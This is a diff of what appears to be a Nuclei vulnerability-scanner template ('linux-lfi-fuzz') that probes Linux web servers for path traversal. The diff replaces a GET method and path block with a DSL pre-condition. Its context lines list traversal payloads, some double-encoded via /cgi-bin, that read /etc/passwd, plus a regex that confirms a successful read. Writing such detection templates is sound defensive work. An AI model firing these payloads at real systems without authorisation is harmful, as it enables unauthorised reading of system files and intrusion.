@@ -10,9 +10,6 @@ http:
     regex:
     - 'root:.*:0:0:'
     type: regex
-  method: GET
-  path:
-  - '{{BaseURL}}'
   payloads:
     nix_fuzz:
     - /etc/passwd
@@ -61,6 +58,10 @@ http:
     - /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
     - /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
     - /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+  pre-condition:
+  - dsl:
+    - method == "GET"
+    type: dsl
   stop-at-first-match: true
 id: linux-lfi-fuzz
 info:
